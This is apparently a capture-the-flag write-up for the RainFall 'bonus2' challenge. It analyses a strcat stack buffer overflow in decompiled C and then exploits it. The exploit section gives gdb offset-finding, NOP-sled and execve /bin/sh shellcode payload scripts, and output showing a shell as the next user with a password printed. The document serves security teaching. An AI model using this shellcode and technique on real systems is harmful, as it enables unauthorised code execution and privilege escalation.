  switch ( language ) {

<table  style="margin: 0 auto;">
  <tr>
    <th>Assembly Code</th>
    <th>C Code</th>
  </tr>
  <tr>
    <td>
<pre><code class="language-asm">

Dump of assembler code for function main:
   0x08048529 <+0>:     push   ebp
   0x0804852a <+1>:     mov    ebp,esp
   .
   .
   .
   0x0804862b <+258>:   call   0x8048484 <greetuser>
   .
   .
   0x08048636 <+269>:   pop    ebp
   0x08048637 <+270>:   ret

Dump of assembler code for function greetuser:
   0x08048484 <+0>:     push   ebp
   0x08048485 <+1>:     mov    ebp,esp
   0x08048487 <+3>:     sub    esp,0x58
   0x0804848a <+6>:     mov    eax,ds:0x8049988
   .
   .
   .
   0x08048527 <+163>:   leave
   0x08048528 <+164>:   ret
</code></pre>
</td>
<td>
<pre><code class="language-c">
int language;

void greetuser(char *src) {
  char dest[72];

  switch ( language ) {
    case 2:
      strcpy(dest, "Goedemiddag! ");
      break;
    case 0:
      strcpy(dest, "Hello ");
      break;
  }
  strcat(dest, src);
  puts(dest);
}

int main(int argc, const char **argv) {
  char s1[76];
  char s2[76];
  char *lang;

  if ( argc != 3 )  return 1;
  memset(s2, 0, sizeof(dest));
  strncpy(s2, argv[1], 40);
  strncpy(s2 + 40, argv[2], 32);
  lang = getenv("LANG");
  if ( lang ) {
    if ( !memcmp(lang, "fi", 2) )         language = 1;
    else if ( !memcmp(lang, "nl", 2) )    language = 2;
  }
  memcpy(s1, s2, sizeof(s1));
  greetuser(s1);
}
</code></pre>
</td>
</tr>
</table>


# Exploring


### `main` Function

- **Arguments Check**: The program expects exactly three command-line arguments (`argc == 3`), including the program name, `argv[1]`, and `argv[2]`. If this condition isn’t met, it exits with a return value of 1.
- **Buffer Declarations**: 
  - `s1` and `s2` are character arrays, each 76 bytes in size (`char s1[76]`, `char s2[76]`).
- **Initialization**:
  - `memset(s2, 0, sizeof(dest))` attempts to zero-initialize `s2`, but `dest` is a variable defined in `greetuser`, not `main`. This is likely a typo in the code as provided. Since `dest` in `greetuser` is 72 bytes, the intent might be to clear the first 72 bytes of `s2`. For clarity, we’ll assume it’s meant to be `memset(s2, 0, 72)`, though in a correct context, it should be `sizeof(s2)` or explicitly 76 bytes. We’ll proceed with it clearing 72 bytes as per the apparent intent.
- **String Copying**:
  - `strncpy(s2, argv[1], 40)` copies up to 40 bytes from `argv[1]` into the start of `s2`. If `argv[1]` is shorter than 40 bytes, it pads the remainder with null bytes (`\0`). If longer, it copies only the first 40 bytes without adding a null terminator.
  - `strncpy(s2 + 40, argv[2], 32)` copies up to 32 bytes from `argv[2]` into `s2` starting at offset 40 (i.e., `s2[40]` to `s2[71]`). The same null-padding or truncation rules apply.
  - Total data copied into `s2` is 40 + 32 = 72 bytes, fitting within `s2`’s 76-byte size, leaving the last 4 bytes (indices 72–75) as zeros from the `memset`.
- **Language Setting**:
  - Retrieves the "LANG" environment variable using `getenv("LANG")`.
  - Sets the global variable `language` based on the prefix: "fi" → `language = 1`, "nl" → `language = 2`. Otherwise, `language` remains 0 (its default value).
- **Buffer Copy**: `memcpy(s1, s2, sizeof(s1))` copies all 76 bytes of `s2` into `s1`. Thus, `s1` contains 72 bytes of user-controlled data (from `argv[1]` and `argv[2]`) followed by 4 null bytes.
- **Function Call**: Passes `s1` to `greetuser`.

### `greetuser` Function

- **Buffer Declaration**: Declares a local array `dest` of 72 bytes (`char dest[72]`) on the stack.
- **Greeting Copy**:
  - Based on the global `language` value:
    - `language == 2`: `strcpy(dest, "Goedemiddag! ")` copies "Goedemiddag! " (13 characters + null terminator = 14 bytes) into `dest`.
    - `language == 0`: `strcpy(dest, "Hello ")` copies "Hello " (6 characters + null terminator = 7 bytes) into `dest`.
    - Other values: No action is taken, leaving `dest` uninitialized, but we’ll assume it’s zeroed or irrelevant unless the switch case applies.
- **String Concatenation**: `strcat(dest, src)` appends the contents of `src` (i.e., `s1` from `main`) to `dest`, starting after the greeting’s null terminator. `strcat` copies characters from `src` until it encounters a null terminator (`\0`).
- **Output**: `puts(dest)` prints the resulting string.

---

## The Vulnerability

The stack buffer overflow occurs in `greetuser` due to `strcat(dest, src)`. Here’s why:

- **Buffer Size**: `dest` is allocated 72 bytes.
- **Data Written**:
  - **Greeting**: "Hello " (7 bytes including `\0`) or "Goedemiddag! " (14 bytes including `\0`).
  - **Appended Data**: `src` is `s1`, which contains 72 bytes of data from `argv[1]` (bytes 0–39) and `argv[2]` (bytes 40–71), followed by 4 null bytes (bytes 72–75).
- **Behavior of `strcat`**:
  - `strcat` starts appending at the end of the current string in `dest` (after the greeting’s `\0`) and copies from `src` until it finds a `\0`.
  - If `argv[1]` is a 40-byte string without a `\0`, and `argv[2]` is a 32-byte string without a `\0`, then `s1[0]` to `s1[71]` (72 bytes) contain continuous data. The first `\0` in `s1` appears at `s1[72]` (the 73rd byte).
  - Thus, `strcat` copies 72 bytes from `s1[0]` to `s1[71]`, plus a null terminator.

- **Overflow Calculation**:
  - **Case 1: `language = 2` ("Goedemiddag! ")**:
    - Greeting: 14 bytes (`dest[0]` to `dest[13]`, with `\0` at `dest[13]`).
    - Appends 72 bytes from `src`: `dest[13]` to `dest[84]` (indices 13 to 13+72-1).
    - Writes `\0` at `dest[85]`.
    - Total: 14 + 72 = 86 bytes, exceeding `dest`’s 72 bytes by 14 bytes (86 - 72 = 14).
  - **Case 2: `language = 0` ("Hello ")**:
    - Greeting: 7 bytes (`dest[0]` to `dest[6]`, with `\0` at `dest[6]`).
    - Appends 72 bytes from `src`: `dest[6]` to `dest[77]` (6+72-1).
    - Writes `\0` at `dest[78]`.
    - Total: 7 + 72 = 79 bytes, exceeding `dest`’s 72 bytes by 7 bytes (79 - 72 = 7).

- **Consequence**: Writing beyond `dest[71]` (the last index of `dest`) overwrites adjacent stack memory, including the saved EBP and return address (EIP), allowing an attacker to alter the program’s control flow.

---

### Stack Memory Visualization

#### Function Prologue
  - Caller pushes the return address.
  - `greetuser` pushes the old EBP, sets EBP to ESP, then allocates 72 bytes for `dest` by subtracting 72 from ESP.

#### Stack Layout
Let’s assign `EBP - 72` as the base address of `dest`:
- **`dest[0]` to `dest[71]`**: 72 bytes at `[EBP - 72]` to `[EBP - 1]`.
- **Saved EBP**: 4 bytes at `[EBP]`.
- **Return Address (EIP)**: 4 bytes at `[EBP + 4]`.

Using a diagram with addresses increasing from bottom to top:

```
+---------------------------+
| Address   | Content       |
|-----------|---------------| (lower address)
| ...       |               |
| EBP - 72  | dest[0]       |  <- Start of dest
| EBP - 71  | dest[1]       |
| ...       | ...           |
| EBP - 1   | dest[71]      |  <- End of dest
| EBP       | Saved EBP     |  <- Frame pointer
| EBP + 4   | Return Address|  <- EIP
| ...       |               |
+---------------------------+ (higher address)
```

#### Overflow Scenario
**Example with "Goedemiddag! " (`language = 2`)**:
- `strcpy`: Writes "Goedemiddag! \0" to `dest[0]` to `dest[13]` (14 bytes).
- `strcat`: Appends `src[0]` to `src[71]` (72 bytes) starting at `dest[13]`:
  - `dest[13]` to `dest[84]` receives `src[0]` to `src[71]`.
  - `dest[85]` gets `\0`.
- **Memory Impact**:
  - `dest[0]` to `dest[71]`: `[EBP - 72]` to `[EBP - 1]` (within bounds).
  - `dest[72]` to `dest[75]`: `[EBP]` to `[EBP + 3]` → overwrites saved EBP.
  - `dest[76]` to `dest[79]`: `[EBP + 4]` to `[EBP + 7]` → overwrites return address.
  - `dest[80]` to `dest[85]`: `[EBP + 8]` to `[EBP + 13]` → overwrites beyond EIP.

Overflowed stack:
```
+-----------------------------+
| Address   | Content         |
|-----------|-----------------|
| EBP - 72  | 'G'             |
| ...       | "Goedemiddag! " |
| EBP - 59  | src[0]          |
| ...       | ...             |
| EBP - 1   | src[58]         |
| EBP       | src[59]..       |  <- Saved EBP overwritten
| EBP + 4   | ..src[63]..     |  <- Return Address overwritten
| EBP + 8   | ..src[67]..     |
| EBP + 12  | ..src[71]       |
| EBP + 13  | '\0'            |
| ...       |                 |
+-----------------------------+
```

---

### Exploitation Potential

We can:

1. **Craft Input**: Supply `argv[1]` (40 bytes) and `argv[2]` (32 bytes) with no null bytes in the first 72 bytes of `s1`, followed by `\0` at `s1[72]`.
2. **Control Overflow**: Include:
   - Shellcode within the 72 bytes.
   - A new return address (e.g., pointing to `dest`) at `dest[76]` to `dest[79]`.
3. **Execution**: When `greetuser` returns, the corrupted EIP redirects execution to the attacker’s code.

For example:
- `argv[1]`: 40 bytes of shellcode.
- `argv[2]`: 32 bytes, with the last 4 bytes as the address of `dest`.
- Result: `s1` overflows `dest`, placing the shellcode in the stack and redirecting EIP to it.

---

# Exploiting

Find offset from **second argument** to stored **EIP**.

First make sure to set **LANG** env to **nl** with `export LANG=nl`.


```
 ❯ python3 tools/cyclic.py -g 40
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A


=> 0x08048527 <+163>:   leave
   0x08048528 <+164>:   ret
End of assembler dump.
gdb-peda$ x/wx $ebp + 0x4
0xbffff60c:     0x38614137


 ❯ python3 tools/cyclic.py -o 0x38614137
Offset found at: 23
```

So the offset between **EIP** and start of **second argument** is **23**.

We have **40** (first argument) + **23** = **63** to put a shellcode within.

the address of `dest` on greetuser which contain `argv1 + argv2` is `0xbffff5c0`:

```
gdb-peda$ p $ebp - 0x48
$1 = (void *) 0xbffff5c0
```

Due gdb add some extrat envs before initialize the proccess, cause to move stack addresses up, usually the actual address on normal execution is `-16 to -32`.

So we have a guess that the address of `dest` is `0xbffff5b0 to 0xbffff5a0`, we fill unknown padding with **NOP** `\x90` instruction which is do nothing just skiping until to start of our **shellcode**.

The payload looks like:

```
    |\x90\x90\x90....\x90\x90<begin-of-shell-code|rest-of-shell-code>|<address-of-dest>|
    ^             ^                              ^ last 23B of shell ^  point-to-2
    1             2
```

`1`: actual start of **dest**, probability `0xbffff5b0`.
`2`: the address of overridden **EIP** point back to shellcode, is our case we set it to `0xbffff5a0` -> `\xa0\xf5\xff\xbf`.


So first argument payload is:

```
bonus2@RainFall:~$ cat buff1.py
shell = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e'

nop_len = 40 - len(shell)

buff = '\x90' * nop_len + shell

print buff,
```

the second one is:

```
bonus2@RainFall:~$ cat buff2.py
shell = '\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80'

shell_addr = '\xa0\xf6\xff\xbf'

padding_len = 23 - len(shell)

buff = shell + 'a' * padding_len + shell_addr

print buff,
```


Output:

```
bonus2@RainFall:~$ ./bonus2 `python2 buff1.py` `python2 buff2.py`
Goedemiddag! 1Ph//shh/binPS1Ұ
                             ̀11aaa
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

It works, see you on the next challenge.
